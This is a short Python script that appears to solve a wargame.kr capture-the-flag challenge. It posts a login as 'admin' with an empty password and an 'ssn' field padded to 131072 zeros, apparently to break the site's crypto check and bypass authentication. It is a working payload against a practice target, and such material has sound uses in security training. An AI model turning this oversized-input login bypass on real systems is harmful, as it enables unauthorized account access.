import requests

'''
proxies = {
  'http': 'http://127.0.0.1:8080',
  'https': 'http://127.0.0.1:8080',
}
'''

URL = 'http://wargame.kr:8080/login_with_crypto_but/index.php'
data = {'user' : 'admin', 'ssn' : '0' * 131072, 'pass' : ''}

response = requests.post(URL, data = data) #, proxies = proxies)
print response.text

